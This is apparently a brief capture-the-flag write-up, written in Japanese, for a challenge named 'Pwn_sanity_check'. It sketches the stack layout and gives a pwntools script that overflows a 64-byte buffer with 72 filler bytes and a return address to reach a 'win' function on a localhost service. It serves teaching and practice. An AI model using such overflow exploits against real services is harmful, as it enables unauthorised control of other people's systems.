# Pwn_sanity_check

## description 

実行ファイルが与えられるのでこれを解いてflagをゲットするおなじみのやつ

## solution

| local values (buffer[64]) |
| ------------------------- |
| local values ( cmp)       |
| rbp                       |
| return address            |

でbufferで0x100読み取っているので72文字ほど適当な文字を送って、winに飛ばせればいい

```
from pwn import *

context.update(arch="i386", os="linux")
p = remote('localhost',4088)
#e = ELF("./pwn_sanity_check")
#p = e.process(level="error")
payload = b"A" * 72 + p64(0x4006db) 

# overflow me:
p.sendline(payload)
p.interactive()

```

